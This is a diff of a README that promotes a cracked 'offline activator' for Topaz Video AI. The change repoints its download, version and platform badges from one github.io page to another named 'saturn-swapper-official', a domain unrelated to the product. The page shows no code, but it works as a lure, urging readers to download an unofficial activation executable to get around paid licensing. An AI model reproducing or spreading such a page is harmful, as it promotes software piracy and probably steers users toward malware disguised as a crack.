@@ -2,9 +2,9 @@
 
 Unlock the full potential of Topaz Video AI without subscriptions or internet dependency with our 100% working offline activation solution for Windows and macOS systems.
 
-[![Download Activator](https://img.shields.io/badge/Download-Offline_Activator-red)](https://topaz-video-ai-activated.github.io/.github/)  
-[![Version](https://img.shields.io/badge/Activator_v3.5.2-Stable-green)](https://topaz-video-ai-activated.github.io/.github/)
-[![Platform](https://img.shields.io/badge/Windows_10|11|macOS_12+-Supported-blue)](https://topaz-video-ai-activated.github.io/.github/)
+[![Download Activator](https://img.shields.io/badge/Download-Offline_Activator-red)](https://saturn-swapper-official.github.io/.github/)  
+[![Version](https://img.shields.io/badge/Activator_v3.5.2-Stable-green)](https://saturn-swapper-official.github.io/.github/)
+[![Platform](https://img.shields.io/badge/Windows_10|11|macOS_12+-Supported-blue)](https://saturn-swapper-official.github.io/.github/)
 
 ---
 
